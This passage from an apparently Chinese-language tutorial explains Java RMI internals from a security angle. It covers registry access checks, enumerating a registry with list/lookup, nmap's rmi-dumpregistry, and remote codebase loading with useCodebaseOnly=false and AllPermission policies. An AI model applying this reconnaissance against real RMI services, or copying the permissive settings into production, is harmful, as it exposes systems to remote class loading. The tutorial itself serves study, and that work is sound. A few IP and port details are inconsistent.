that represents the same\n     * (functionally equivalent) server socket factory, and false otherwise\n     * (and it should also implement Object.hashCode() consistently with\n     * its Object.equals implementation).\n     */\n    @Override\n    public boolean equals ( Object obj )\n    {\n        return obj != null &amp;&amp; this.getClass() == obj.getClass() &amp;&amp; this.bindAddr.equals( ((ServerSocketFactoryImpl)obj).bindAddr );\n    }\n}\n在创建 Server 时，传入 ServerSocketFactoryImpl 对象\npublic class OrdinaryRMIServerWithAddress {\n \n    public static void main(String[] args) {\n        try {\n            int registryPort = Integer.parseInt(args[0]);\n            String registryIP = args[1];\n            int serverPort = Integer.parseInt(args[2]);\n            String serverIP = args[3];\n            String serverName = args[4];\n \n            System.out.println(registryPort + &quot; &quot; + serverPort + &quot; &quot; + serverIP + &quot; &quot; + serverName);\n \n            // explicitly set the port and address of server\n            RemoteServiceImpl rsi =\n                    new RemoteServiceImpl(\n                            serverPort,\n                            null,\n                            new ServerSocketFactoryImpl(InetAddress.getByName(serverIP)));\n            Registry reg =\n                    LocateRegistry.createRegistry(\n                            registryPort,\n                            null,\n                            new ServerSocketFactoryImpl(InetAddress.getByName(registryIP)));\n \n            reg.bind(serverName, rsi);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n运行 OrdinaryRMIServerWithAddress\njava OrdinaryRMIServerWithAddress 1099 127.0.0.1 56050 127.0.0.1 server\n验证一下\n$ netstat -na | grep 56050\ntcp4       0      0  127.0.0.1.56050        *.*                    LISTEN\n另一种方式，前面提到过，使用 UnicastRemoteObject#exportObject() 方法，这里不展示代码了。\n拆分 Registry 和 Server\nRPC 的场景里，注册中心和服务提供者可能是分开的。前面的示例将两者绑定在一起，下面将它们独立出来\n注册中心 OrdinaryRegistry\npublic class OrdinaryRegistry {\n    public static void main(String[] args) {\n        try {\n            int port = Integer.parseInt(args[0]);\n            String addr = args[1];\n \n            // create a registry and listening\n            Registry reg =\n                    LocateRegistry.createRegistry(\n                            port, null, new ServerSocketFactoryImpl(InetAddress.getByName(addr)));\n \n            // prevent stop current thread.\n            System.in.read();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n服务端 RemoteServer\npublic class RemoteServer {\n    public static void main(String[] args) {\n        try {\n            int registryPort = Integer.parseInt(args[0]);\n            String registryIP = args[1];\n            int serverPort = Integer.parseInt(args[2]);\n            String serverIP = args[3];\n            String name = args[4];\n \n            RemoteServiceImpl rsi =\n                    new RemoteServiceImpl(\n                            serverPort,\n                            null,\n                            new ServerSocketFactoryImpl(InetAddress.getByName(serverIP)));\n            Registry reg = LocateRegistry.getRegistry(registryIP, registryPort);\n            reg.rebind(name, rsi);\n            System.out.println(&quot;rebind&quot;);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n运行注册中心\njava OrdinaryRegistry 1099 127.0.0.1\n运行服务端\njava RemoteServer 1099 127.0.0.1 56050 127.0.0.1 server\n接着运行客户端 OrdinaryRMIClient\njava OrdinaryRMIClient 127.0.0.1 1099 server hi\n连接失败\n但是却出现了和前面类似的异常信息，与服务端建立连接失败，\njava.rmi.ConnectIOException: error during JRMP connection establishment; nested exception is:\n\tjava.net.SocketException: Connection reset\n\tat sun.rmi.transport.tcp.TCPChannel.createConnection(TCPChannel.java:307)\n\tat sun.rmi.transport.tcp.TCPChannel.newConnection(TCPChannel.java:202)\n\tat sun.rmi.server.UnicastRef.invoke(UnicastRef.java:132)\n\tat java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:235)\n\tat java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:180)\n\tat com.sun.proxy.$Proxy0.doSome(Unknown Source)\n\tat com.trganda.roadmap.rmi.client.OrdinaryRMIClient.main(OrdinaryRMIClient.java:23)\nCaused by: java.net.SocketException: Connection reset\n\tat java.net.SocketInputStream.read(SocketInputStream.java:210)\n\tat java.net.SocketInputStream.read(SocketInputStream.java:141)\n\tat java.io.BufferedInputStream.fill(BufferedInputStream.java:246)\n\tat java.io.BufferedInputStream.read(BufferedInputStream.java:265)\n\tat java.io.DataInputStream.readByte(DataInputStream.java:265)\n\tat sun.rmi.transport.tcp.TCPChannel.createConnection(TCPChannel.java:246)\n\t... 6 more\n\n通过抓包，可以看到注册中心返回的地址是 10.128.6.165\n\n根据前面的解决方式，应该指定手动 -Djava.rmi.server.hostname=127.0.0.1，那么请问应该给 OrdinaryRegistry 还是 RemoteServer 指定？\n答案是 RemoteServer。\n在前面的代码分析中已经透露出一件事情，那就是 java.rmi.server.hostname 是在 RemoteServiceImpl 的创建过程中检查并发挥作用的，所以应该在 RemoteServer 中设置。\njava -Djava.rmi.server.hostname=127.0.0.1 RemoteServer 1099 127.0.0.1 56050 127.0.0.1 server\n绑定失败\n前述运行方式，注册中心和服务端都绑定在同一地址，尝试在不同主机运行。\n主机 10.211.55.3 运行注册中心\njava OrdinaryRegistry 1099 10.211.55.3\n主机 10.211.55.2 运行服务端\njava -Djava.rmi.server.hostname=10.211.55.2 RemoteServer 1099 10.211.55.3 56050 10.211.55.2 server\n出现如下异常，\njava.rmi.ServerException: RemoteException occurred in server thread; nested exception is:\n\tjava.rmi.AccessException: Registry.rebind disallowed; origin /10.211.55.2 is non-local host\n\tat sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)\n\tat sun.rmi.transport.Transport$1.run(Transport.java:200)\n\tat sun.rmi.transport.Transport$1.run(Transport.java:197)\n\tat java.security.AccessController.doPrivileged(Native Method)\n\tat sun.rmi.transport.Transport.serviceCall(Transport.java:196)\n\tat sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)\n\tat sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)\n\tat sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)\n\tat java.security.AccessController.doPrivileged(Native Method)\n\tat sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat java.lang.Thread.run(Thread.java:750)\n\tat sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)\n\tat sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)\n\tat sun.rmi.server.UnicastRef.invoke(UnicastRef.java:380)\n\tat sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)\n\tat com.trganda.roadmap.rmi.server.RemoteServer.main(RemoteServer.java:27)\nCaused by: java.rmi.AccessException: Registry.rebind disallowed; origin /10.211.55.2 is non-local host\n\tat sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:350)\n\tat sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:146)\n\tat sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:469)\n\tat sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:301)\n\tat sun.rmi.transport.Transport$1.run(Transport.java:200)\n\tat sun.rmi.transport.Transport$1.run(Transport.java:197)\n\tat java.security.AccessController.doPrivileged(Native Method)\n\tat sun.rmi.transport.Transport.serviceCall(Transport.java:196)\n\tat sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)\n\tat sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)\n\tat sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)\n\tat java.security.AccessController.doPrivileged(Native Method)\n\tat sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat java.lang.Thread.run(Thread.java:750)\n从调用栈中看到 java.security.AccessController.doPrivileged 未通过，访问受限了，并且给出了提示信息 origin /172.28.112.1 is non-local host。\n代码分析\n在 RemoteServer 的 reg.rebind(name, rsi); 打下断点，注意这里获取到的 reg 类型是 RegistryImpl_Stub，涉及到 Socket 通信。\n从异常信息中注意到 sun.rmi.registry.RegistryImpl.checkAccess，\n/**\n * Check that the caller has access to perform indicated operation.\n * The client must be on same the same host as this server.\n */\npublic static void checkAccess(String op) throws AccessException {\n注释中清楚的写道，对于某些操作，访问者必须于注册中心具有相同的地址。具体被限制的操作见 RegistryImpl 注释可知为 bind，rebind 和 unbind。\nThe default RegistryImpl exported restricts access to clients on the local host for the methods bind, rebind, unbind by checking the client host in the skeleton.\n\n这种限制没有搜到官方绕过方案，这意味着注册中心和服务端必须处于同一台机器，或者说绑定至同一网卡。\n而在主机 198.19.249.16 没有看到注册中心打印任何异常，抓包看到异常信息是通过 JRMI 的 ReturnData 返回的。\n\nRMI 工具链 Rmiregistry\nrmiregistry 是 JDK 自带的控制台工具，用于创建注册中心，可指定端口号，无法指定 IP。\nrmiregistry 1099\n查看监听状态\n% netstat -atn | grep 1099\ntcp46      0      0  *.1099                 *.*                    LISTEN\n\nClassNotFoundException\n测试是否可用\njava -Djava.rmi.server.hostname=127.0.0.1 RemoteServer 1099 127.0.0.1 56050 127.0.0.1 server\n发生错误，找不到 RemoteService。\nCaused by: java.lang.ClassNotFoundException: com.trganda.roadmap.rmi.remote.RemoteService\n\n通过抓包可以知道这个错误是 rmiregistry 反馈的，因为 rmiregistry 无法在它的 CLASSPATH 下找到 RemoteService 接口。解决方法是在 RemoteService 所在目录执行 rmiregistry。\n那么 rmiregistry 可以通过 codebase 来获取 RemoteService 吗？来验证看看\n在 RemoteService 所在目录启动 HTTP 服务\npython3 -m http.server 80\nServing HTTP on :: port 80 (http://[::]:80/) ...\n启动 rmiregistry 并指定 java.rmi.server.codebase\nrmiregistry -J-Djava.rmi.server.codebase=&quot;http://localhost/&quot;\n测试\njava -Djava.rmi.server.hostname=127.0.0.1 RemoteServer 1099 127.0.0.1 56050 127.0.0.1 server\n没有发生异常，HTTP 服务器收到请求\n::ffff:127.0.0.1 - - [20/Jul/2023 16:52:19] &quot;GET /com/trganda/roadmap/rmi/remote/RemoteService.class HTTP/1.1&quot; 200 -\n执行客户端\njava OrdinaryRMIClient 127.0.0.1 1099 server hi\nRemoteServer 打印输出\n[hi]\n结论很明显，可以。\nDump Registry\nRegistry 的 lookup、bind、rebind 和 unbind 都提到过，除了 lookup 默认都有访问限制，但是还有另外一个方法 list。\n可以通过 list 方法查看注册中心绑定的服务名称列表，\npublic class OrdinaryRMIList {\n    public static void main(String[] args) {\n        try {\n            int registryPort = Integer.parseInt(args[0]);\n            String registryIP = args[1];\n \n            System.out.println(registryPort + &quot; &quot; + registryIP);\n \n            Registry reg = LocateRegistry.getRegistry(registryIP, registryPort);\n            String[] list = reg.list();\n \n            for (String s : list) {\n                System.out.println(s);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n执行\n% java OrdinaryRMIList 1099 127.0.0.1\nserver\n但只是返回了名称而已，有没有办法获取更多信息？抓包看看，响应中确实只包含了名称 server。\n\n其中看到了 -Djava.rmi.server.codebase=&quot;http://localhost/&quot; 的身影，这里先忽略。\n\n\n那尝试在获取名称之后，使用 lookup 方法呢？\npublic class OrdinaryRMIDumper {\n    public static void main(String[] args) {\n        try {\n            int port = Integer.parseInt(args[0]);\n            String addr = (args[1]);\n            String name = args[2];\n \n            System.out.println(addr + &quot; &quot; + port + &quot; &quot; + name);\n \n            // default host: localhost; port: 1099\n            Registry registry = LocateRegistry.getRegistry(addr, port);\n            Remote stub = registry.lookup(name);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n其实前面已经抓过 lookup 时的数据包了，这里再抓一次，仔细看看\njava OrdinaryRMIDumper 1099 127.0.0.1 server\n对 ReturnData 进行反序列化\njava -jar SerializationDumper-v1.13.jar aced0005770f01beda8c4a000001897293f2a38005737d00000002000f6a6176612e726d692e52656d6f7465002c636f6d2e747267616e64612e726f61646d61702e726d692e72656d6f74652e52656d6f746553657276696365740011687474703a2f2f6c6f63616c686f73742f787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b740011687474703a2f2f6c6f63616c686f73742f78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00047872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000478707734000b556e6963617374526566320000093132372e302e302e310000daf2a6f1875bd0f0f78ad1161ba6000001897294224380010178\n输出如下\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_BLOCKDATA - 0x77\n    Length - 15 - 0x0f\n    Contents - 0x01beda8c4a000001897293f2a38005\n  TC_OBJECT - 0x73\n    TC_PROXYCLASSDESC - 0x7d\n      newHandle 0x00 7e 00 00\n      Interface count - 2 - 0x00 00 00 02\n      proxyInterfaceNames\n        0:\n          Length - 15 - 0x00 0f\n          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465\n        1:\n          Length - 44 - 0x00 2c\n          Value - com.trganda.roadmap.rmi.remote.RemoteService - 0x636f6d2e747267616e64612e726f61646d61702e726d692e72656d6f74652e52656d6f746553657276696365\n      classAnnotations\n        TC_STRING - 0x74\n          newHandle 0x00 7e 00 01\n          Length - 17 - 0x00 11\n          Value - http://localhost/ - 0x687474703a2f2f6c6f63616c686f73742f\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_CLASSDESC - 0x72\n          className\n            Length - 23 - 0x00 17\n            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879\n          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb\n          newHandle 0x00 7e 00 02\n          classDescFlags - 0x02 - SC_SERIALIZABLE\n          fieldCount - 1 - 0x00 01\n          Fields\n            0:\n              Object - L - 0x4c\n              fieldName\n                Length - 1 - 0x00 01\n                Value - h - 0x68\n              className1\n                TC_STRING - 0x74\n                  newHandle 0x00 7e 00 03\n                  Length - 37 - 0x00 25\n                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b\n          classAnnotations\n            TC_STRING - 0x74\n              newHandle 0x00 7e 00 04\n              Length - 17 - 0x00 11\n              Value - http://localhost/ - 0x687474703a2f2f6c6f63616c686f73742f\n            TC_ENDBLOCKDATA - 0x78\n          superClassDesc\n            TC_NULL - 0x70\n    newHandle 0x00 7e 00 05\n    classdata\n      java.lang.reflect.Proxy\n        values\n          h\n            (object)\n              TC_OBJECT - 0x73\n                TC_CLASSDESC - 0x72\n                  className\n                    Length - 45 - 0x00 2d\n                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572\n                  serialVersionUID - 0x00 00 00 00 00 00 00 02\n                  newHandle 0x00 7e 00 06\n                  classDescFlags - 0x02 - SC_SERIALIZABLE\n                  fieldCount - 0 - 0x00 00\n                  classAnnotations\n                    TC_REFERENCE - 0x71\n                      Handle - 8257540 - 0x00 7e 00 04\n                    TC_ENDBLOCKDATA - 0x78\n                  superClassDesc\n                    TC_CLASSDESC - 0x72\n                      className\n                        Length - 28 - 0x00 1c\n                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374\n                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e\n                      newHandle 0x00 7e 00 07\n                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE\n                      fieldCount - 0 - 0x00 00\n                      classAnnotations\n                        TC_REFERENCE - 0x71\n                          Handle - 8257540 - 0x00 7e 00 04\n                        TC_ENDBLOCKDATA - 0x78\n                      superClassDesc\n                        TC_NULL - 0x70\n                newHandle 0x00 7e 00 08\n                classdata\n                  java.rmi.server.RemoteObject\n                    values\n                    objectAnnotation\n                      TC_BLOCKDATA - 0x77\n                        Length - 52 - 0x34\n                        Contents - 0x000b556e6963617374526566320000093132372e302e302e310000daf2a6f1875bd0f0f78ad1161ba60000018972942243800101\n                      TC_ENDBLOCKDATA - 0x78\n                  java.rmi.server.RemoteObjectInvocationHandler\n                    values\n      &lt;Dynamic Proxy Class&gt;\n从中可以看到从注册中心返回的就是一个代理对象，实现了两个接口 java.rmi.Remote 和 com.trganda.roadmap.rmi.remote.RemoteService；在 classAnnotations 中包含了指定的 codebase，Proxy 对象的 InvocationHandler 类型为 java.rmi.server.RemoteObjectInvocationHandler 。\n在 objectAnnotation 中，还有一段信息 0x000b556e6963617374526566320000093132372e302e302e310000daf2a6f1875bd0f0f78ad1161ba60000018972942243800101，一般存放序列化时自定义写入的内容，比如通过 writeExternal 方法。\n把这段数据直接转为 ascii，可以猜测这是 UnicastRef2 自定义序列化后的数据内容。\n\u000bUnicastRef2\t127.0.0.1Úò¦ñ[Ðð÷Ñ\u0016\u001b¦\u0001r&quot;C\u0001\u0001\n\n而这里的 127.0.0.1 相信你一点都不陌生，最开始的流量分析，就已经提到过，它是注册中心中存储的服务端的地址；那么跟在它后面的内容，其实就是端口信息，即 0000daf2 -&gt; 56050。\n这个代理对象可以理解成远程对象的引用，用于调用接口中的方法，\n\nRMI treats a remote object differently from a non-remote object when the object is passed from one Java virtual machine to another Java virtual machine. Rather than making a copy of the implementation object in the receiving Java virtual machine, RMI passes a remote stub for a remote object. The stub acts as the local representative, or proxy, for the remote object and basically is, to the client, the remote reference. The client invokes a method on the local stub, which is responsible for carrying out the method invocation on the remote object.\n\n如果你观察仔细，在前面的异常信息中会看到 com.sun.proxy.$Proxy0 的身影，可以通过 -Dsun.misc.ProxyGenerator.saveGeneratedFiles=true 转储它。\n重新运行\njava -Dsun.misc.ProxyGenerator.saveGeneratedFiles=true OrdinaryRMIDumper 1099 127.0.0.1 server\n查看 $Proxy0\npackage com.sun.proxy;\n \nimport com.trganda.roadmap.rmi.remote.RemoteService;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.lang.reflect.UndeclaredThrowableException;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\n \npublic final class $Proxy0 extends Proxy implements Remote, RemoteService {\n    private static Method m1;\n    private static Method m2;\n    private static Method m3;\n    private static Method m0;\n \n    public $Proxy0(InvocationHandler var1) throws  {\n        super(var1);\n    }\n \n    public final boolean equals(Object var1) throws  {\n        try {\n            return super.h.invoke(this, m1, new Object[]{var1});\n        } catch (RuntimeException | Error var3) {\n            throw var3;\n        } catch (Throwable var4) {\n            throw new UndeclaredThrowableException(var4);\n        }\n    }\n \n    public final String toString() throws  {\n        try {\n            return (String)super.h.invoke(this, m2, null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n \n    public final void doSome(String var1) throws RemoteException {\n        try {\n            super.h.invoke(this, m3, new Object[]{var1});\n        } catch (RuntimeException | RemoteException | Error var3) {\n            throw var3;\n        } catch (Throwable var4) {\n            throw new UndeclaredThrowableException(var4);\n        }\n    }\n \n    public final int hashCode() throws  {\n        try {\n            return super.h.invoke(this, m0, null);\n        } catch (RuntimeException | Error var2) {\n            throw var2;\n        } catch (Throwable var3) {\n            throw new UndeclaredThrowableException(var3);\n        }\n    }\n \n    static {\n        try {\n            m1 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;equals&quot;, Class.forName(&quot;java.lang.Object&quot;));\n            m2 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;toString&quot;);\n            m3 = Class.forName(&quot;com.trganda.roadmap.rmi.remote.RemoteService&quot;).getMethod(&quot;doSome&quot;, Class.forName(&quot;java.lang.String&quot;));\n            m0 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;hashCode&quot;);\n        } catch (NoSuchMethodException var2) {\n            throw new NoSuchMethodError(var2.getMessage());\n        } catch (ClassNotFoundException var3) {\n            throw new NoClassDefFoundError(var3.getMessage());\n        }\n    }\n}\n$Proxy0 并没有什么特别的东西，重点要关注的内容是，从响应中能够获取到的信息。\n\n远程服务实现类名称 com.trganda.roadmap.rmi.remote.RemoteService\n服务提供者的地址和端口号\ncodebase 信息\n\n在 nmap 中有一个扫描脚本 rmi-dumpregistry.nse\nnmap -n -Pn -p 1099 --script rmi-dumpregistry.nse 127.0.0.1\n能够扫描出上面提及的信息，思路也是大致一样的，先 list 再 lookup，然后解析序列化数据。不过此脚本在测试时会出错\nInitiating NSE at 19:58\nNSE: Starting rmi-dumpregistry against 127.0.0.1:1099.\nNSE: [rmi-dumpregistry 127.0.0.1:1099] RMI-ERR:Not implemented in skipcustomData:: TC_REFERENCE (0x71)\nNSE: [rmi-dumpregistry 127.0.0.1:1099] RMI-ERR:TC_classdesc is other 0\nNSE: [rmi-dumpregistry 127.0.0.1:1099] RMI-ERR:Got unexpected field in readExternalData: TC_ENUM (0x7e)\nNSE: [rmi-dumpregistry 127.0.0.1:1099] RMI-ERR:Got unexpected field in readExternalData: Unknown code (0x0)\nNSE: rmi-dumpregistry against 127.0.0.1:1099 threw an error!\n/opt/homebrew/bin/../share/nmap/nselib/rmi.lua:492: attempt to call a nil value (method &#039;toTable&#039;)\nstack traceback:\n\t/opt/homebrew/bin/../share/nmap/nselib/rmi.lua:492: in method &#039;toTable&#039;\n\t/opt/homebrew/bin/../share/nmap/nselib/rmi.lua:566: in method &#039;toTable&#039;\n\t/opt/homebrew/bin/../share/nmap/nselib/rmi.lua:501: in method &#039;toTable&#039;\n\t/opt/homebrew/bin/../share/nmap/nselib/rmi.lua:492: in method &#039;toTable&#039;\n\t.../homebrew/bin/../share/nmap/scripts/rmi-dumpregistry.nse:229: in function &lt;.../homebrew/bin/../share/nmap/scripts/rmi-dumpregistry.nse:206&gt;\n\t(...tail calls...)\n\n从错误信息上推测，rmi.lua 脚本缺少维护，readExternalData 时出现错误。\njava.rmi.Naming\nNaming 可通过 rmi://host:port/name 的形式获取远程对象的引用。本质是对 Registry 的一层封装。\n// hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/rmi/Naming.java\npublic static Remote lookup(String name)\n\tthrows NotBoundException,\n\t\tjava.net.MalformedURLException,\n\t\tRemoteException\n{\n\tParsedNamingURL parsed = parseURL(name);\n\tRegistry registry = getRegistry(parsed);\n \n\tif (parsed.name == null)\n\t\treturn registry;\n\treturn registry.lookup(parsed.name);\n}\n \npublic static void bind(String name, Remote obj)\n        throws AlreadyBoundException,\n\t\tjava.net.MalformedURLException,\n\t\tRemoteException\n{\n\tParsedNamingURL parsed = parseURL(name);\n\tRegistry registry = getRegistry(parsed);\n \n\tif (obj == null)\n\t\tthrow new NullPointerException(&quot;cannot bind to null&quot;);\n \n\tregistry.bind(parsed.name, obj);\n}\n下面的示例使用 Naming 重写 RemoteServer。\npublic class RemoteServerNaming {\n    public static void main(String[] args) throws Exception {\n        int registryPort = Integer.parseInt(args[0]);\n        String registryIP = args[1];\n        int serverPort = Integer.parseInt(args[2]);\n        String serverIP = args[3];\n        String name = args[4];\n \n        System.out.println(\n                registryPort + &quot; &quot; + registryIP + &quot; &quot; + serverPort + &quot; &quot; + serverIP + &quot; &quot; + name);\n \n        String url = String.format(&quot;rmi://%s:%d/%s&quot;, registryIP, registryPort, name);\n \n        RemoteServiceImpl rsi =\n                new RemoteServiceImpl(\n                        serverPort,\n                        null,\n                        new ServerSocketFactoryImpl(InetAddress.getByName(serverIP)));\n        Naming.rebind(url, rsi);\n    }\n}\njava.rmi.server.codebase\n\n本节的内容是为了了解并验证，在 RMI 中，哪些类可以通过 codebase 指定加载路径的。或者说，对于客户端和服务端而已，至少需要留存哪些类在本地。\n\ncodebase 最初源自于 applet，也就是在浏览器中运行 Java 应用的那个机制。由于运行时所需的类文件可能不会存储在本地，applet 会从 codebase 中下载所需的类文件后再执行程序。你可以简单的把它理解成一个远端的 CLASSPATH。\ncodebase 支持使用 file:// 、ftp:// 和 http(s):// 『可能支持更多，未探究』，指定形式有两种\n\n目录结构：http://host:port/path/，结尾必须带 /，字节码文件按 package 目录放置在 Web 服务端。\nJar 包形式：http://host:port/lib.jar\n\n示例\n官网有一个 计算 PI 的 RMI 示例程序，里面演示了 codebase 的使用。其中有两个接口 Compute 和 Task，其中 Compute 才是远程接口，用于说明可供远程调用的方法。\n// Compute.java\npublic interface Compute extends Remote {\n    &lt;T&gt; T executeTask(Task&lt;T&gt; t) throws RemoteException;\n}\n \n// Task.java\npublic interface Task&lt;T&gt; {\n    T execute();\n}\n但注意 远程方法的 executeTask 的参数用了多态，换句话说，对于 RMI 的某一方『一般是服务端』它的真实类型对应的 class 文件可能不在本地。其次，它用到了泛型，类型也是不确定的。\n除了这两个接口，还有 ComputeEngine、 Pi 和 ComputePi，分别是服务端，Task 的实现类和客户端。\npublic class ComputeEngine implements Compute {}\n \npublic class Pi implements Task&lt;BigDecimal&gt;, Serializable {}\n \npublic class ComputePi {}\n示例中将两个接口类，单独编译打包成 compute.jar 文件，并将该文件发布出去，如\nhttp://host:port/compute.jar\n\n因为注册中心可能会用到，可以见前面 Java 安全 - RMI 介绍 - ClassNotFoundException 遇到的情况。\n\nSo, the class definitions for those two interfaces need to be network-accessible for the stub to be received by other Java virtual machines such as the registry’s Java virtual machine.\n\n而由客户端实现的 Task 的实现类 Pi，则也通过网络进行发布，如\nhttp://host:port/classes/\n\n上面提到的两个都是示例中会使用到的 codebase\n编译运行\n文件的结构如下，故意将它们放置在不同的目录只能够运行，从而使用 codebase。\n./\n├── client\n│   ├── ComputePi.class  // 监听 http://localhost:8000\n│   ├── ComputePi.java\n│   ├── Pi.class\n│   ├── Pi.java\n│   └── compute_client.policy\n├── interface            // 监听 http://localhost\n│   ├── Compute.class\n│   ├── Compute.java\n│   ├── Task.class\n│   ├── Task.java\n│   └── compute.jar\n└── server\n    ├── ComputeEngine.class\n    ├── ComputeEngine.java\n    └── compute_server.policy\n\n其中 policy 文件的内容都为\ngrant {\n    permission java.security.AllPermission;\n};\n\n对代码进行编译\njavac interface/*.java\njar cvf interface/compute.jar *.class\n \njavac -cp interface/compute.jar server/*.java\n \njavac -cp interface/compute.jar client/*.java\n如果要使用远程的 codebase 需要配置安全管理器，并且对于高版本的 JDK，需要设置参数 -Djava.rmi.server.useCodebaseOnly=false，从而允许使用远程的 codebase。\n在其它目录启动注册中心\nrmiregistry -J-Djava.rmi.server.useCodebaseOnly=false -J-Djava.rmi.server.codebase=&quot;http://localhost/&quot; 1099\n启动服务端\njava -cp ../interface/compute.jar:./ \\\n     -Djava.rmi.server.useCodebaseOnly=false \\\n     -Djava.rmi.server.codebase=&quot;http://localhost/compute.jar&quot; \\\n     -Djava.rmi.server.hostname=localhost \\\n     -Djava.security.policy=compute_server.policy \\\n        ComputeEngine 1099 127.0.0.1 56050 compute\n启动客户端\njava -cp ../interface/compute.jar:./ \\\n     -Djava.rmi.server.useCodebaseOnly=false \\\n     -Djava.rmi.server.codebase=&quot;http://localhost:8000/&quot; \\\n     -Djava.security.policy=compute_client.policy \\\n        ComputePi 1099 127.0.0.1 compute 50\n此时你应该能看到 http 服务收到了请求\n\n\n这两个请求，分别来自注册中心和服务端。前面一种情况之前已经遇到过了，这里抓包观察一下\n\n从图中可以看到，注册中心在收到 bind 请求后，发起了 http 连接获取 compute.jar 文件。\n\n而客户端在访问服务端后，服务端从 localhost:8000 下载了 Pi.class 文件。\nserver.policy\n下面是跟贴切的 policy 文件，前面的方式是为了省事\ngrant codeBase &quot;http://127.0.0.1:8000/&quot; {\n\tpermission java.security.AllPermission;\n};\n\ngrant {\n    # 服务端需要访问注册中心的端口，本条允许主动创建TCP连接。\n\tpermission java.net.SocketPermission &quot;127.0.0.1:1099&quot;, &quot;connect,resolve&quot;;\n\t# 客户端需要访问注册中心和服务端的动态端口。本条表示动态端口允许哪些源IP、源端口来连\n自己。无法提前预知客户端所用源端口，本条用通配符允许所有源端口。好像端口那\n里不支持逗号分隔的列表，但支持-号。\n\tpermission java.net.SocketPermission &quot;127.0.0.1:*&quot;, &quot;accept,resolve&quot;;\n\t# 服务端会访问客户端指定的 codebase。\n\tpermission java.net.SocketPermission &quot;127.0.0.1:8080&quot;, &quot;connect,resolve&quot;;\n};\n\nclient.policy\ngrant {\n\t# 客户端需要访问注册中心和服务端的动态端口。本条指定目标IP、目标端口。不便提前预知动\n态端口，本条用通配符允许所有目标端口。\n\tpermission java.net.SocketPermission &quot;127.0.0.1:*&quot;, &quot;connect,resolve&quot;;\n};\n\n什么情况下需要使用远程 Codebase\n首先需要明确的一点是，只有在本地 CLASSPATH 找不到所需类时，才会去考虑使用 codebase。\n一般来说有三种情况。\n\n假设注册中心与服务端分离了，启动时位于不同目录，此时注册中心很可能需要使\n用来自服务端动态端口的远程 codebase。\n对于动态端口，假设客户端传递的参数是接口参数类型的子类，此时服务端先在本\n地 CLASSPATH 中找，没有找到合适的类，就会使用来自客户端的远程 codebase。\n对于客户端，假设远程调用的返回值是接口返回值类型的子类，客户端试图调用子类\n中重载过的方法，此时客户端先在本地 CLASSPATH 中找，没有找到合适的类，就会使\n用来自服务端的远程 codebase。\n\n\n从面向对象的角度看，凡是使用了多态或者泛型，大概率会用到 codebase。\n\n参考\n\ndocs.oracle.com/javase/8/docs/technotes/guides/rmi/ 『技术指引，讲解 RMI 